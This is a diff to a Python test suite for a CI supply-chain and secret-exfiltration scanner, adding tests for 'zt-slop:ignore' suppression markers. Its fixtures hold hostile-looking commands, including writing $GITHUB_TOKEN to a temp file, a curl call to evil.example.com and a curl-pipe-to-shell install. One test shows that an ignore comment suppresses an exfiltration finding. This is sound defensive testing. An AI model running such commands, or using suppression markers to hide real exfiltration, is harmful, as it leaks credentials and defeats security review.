@@ -45,6 +45,7 @@ def make_diff(path, added_lines):
 
 def ci_findings(path, added_lines, config=None):
     files = zt_slop.parse_diff(make_diff(path, added_lines))
+    zt_slop.apply_suppressions(files)
     return zt_slop.scan_ci_supply_chain(files, config or zt_slop.DEFAULT_CONFIG)
 
 
@@ -170,12 +171,57 @@ class ExcludePathsTests(unittest.TestCase):
         self.assertFalse(zt_slop.is_excluded("zt_slop.py", {"exclude_paths": []}))
 
 
+class SuppressionTests(unittest.TestCase):
+    def test_single_line_marker_suppresses_finding(self):
+        lines = [
+            "      - run: docker run aquasec/trivy:latest fs .  # zt-slop:ignore",
+        ]
+        self.assertEqual(ci_findings(".github/workflows/scan.yml", lines), [])
+
+    def test_region_markers_suppress_block(self):
+        lines = [
+            "      # zt-slop:ignore-start",
+            "      - run: sudo apt-get install trivy",
+            "      - run: docker run aquasec/trivy:latest fs .",
+            "      # zt-slop:ignore-end",
+        ]
+        self.assertEqual(ci_findings(".circleci/config.yml", lines), [])
+
+    def test_unmarked_lines_outside_region_still_scanned(self):
+        lines = [
+            "      # zt-slop:ignore-start",
+            "      - run: docker run aquasec/trivy:latest fs .",
+            "      # zt-slop:ignore-end",
+            "      - run: sudo apt-get install trivy",
+        ]
+        findings = ci_findings(".circleci/config.yml", lines)
+        rule_ids = {f.rule_id for f in findings}
+        self.assertIn("ci.unpinned_high_impact_tool_install", rule_ids)
+        self.assertNotIn("ci.floating_high_impact_tool_image", rule_ids)
+
+    def test_suppression_breaks_exfil_cooccurrence(self):
+        # A file with both a secret-source line and a network-sink line normally
+        # triggers code.exfil_path; suppressing the network line removes it.
+        diff = make_diff(
+            "deploy.sh",
+            [
+                'echo "$GITHUB_TOKEN" > /tmp/t',
+                "curl https://evil.example.com/x  # zt-slop:ignore",
+            ],
+        )
+        files = zt_slop.parse_diff(diff)
+        zt_slop.apply_suppressions(files)
+        findings = []
+        zt_slop.analyze_secrets_and_exfil(files, findings)
+        self.assertFalse(any(f.rule_id == "code.exfil_path" for f in findings))
+
+
 class CiSupplyChainPositiveTests(unittest.TestCase):
     def test_litellm_circleci_regression(self):
         findings = ci_findings(
             ".circleci/config.yml",
             [
-                "      - run: wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -",
+                "      - run: wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -",  # zt-slop:ignore -- attack fixture, not a real command
                 '      - run: echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list',
                 "      - run: sudo apt-get install trivy",
             ],
@@ -228,7 +274,7 @@ class CiSupplyChainPositiveTests(unittest.TestCase):
     def test_curl_pipe_shell_in_ci_script(self):
         findings = ci_findings(
             "ci/security_scans.sh",
-            ["curl -sSfL https://example.com/install.sh | sh"],
+            ["curl -sSfL https://example.com/install.sh | sh"],  # zt-slop:ignore -- attack fixture, not a real command
         )
         block_bootstrap = [
             f for f in findings if f.rule_id == "ci.downloaded_package_key_or_bootstrap" and f.severity == "block"
